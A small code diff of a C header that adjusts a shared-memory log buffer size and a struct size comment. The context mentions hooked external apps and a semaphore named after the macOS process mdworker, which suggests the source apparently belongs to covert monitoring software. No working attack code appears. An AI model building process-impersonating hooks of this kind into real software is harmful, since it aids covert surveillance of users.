@@ -142,7 +142,8 @@ typedef struct os_version {
 #define TIMESTAMP_SIZE sizeof(int) * 2
 
 #define SHMEM_COMMAND_MAX_SIZE  0x3000
-#define SHMEM_LOG_MAX_SIZE      0x300000
+#define SHMEM_LOG_MAX_SIZE      0x302460
+//#define SHMEM_LOG_MAX_SIZE    0x300000
 #define SHMEM_SEM_NAME          @"sem-mdworker"
 
 // Hooked external apps Identifier
@@ -604,7 +605,10 @@ typedef struct _shMemoryCommand {
   u_int commandDataSize;
 } shMemoryCommand;
 
-// size: 0x2710 - 10K
+//
+// size: 0x2720 - 10016
+// OLD!!!! size: 0x2710 - 10K
+//
 typedef struct _shMemoryLog {
   u_int status;                       // 0 - free | 1 - Is Writing | 2 - Written
 #define SHMEM_FREE                0x0
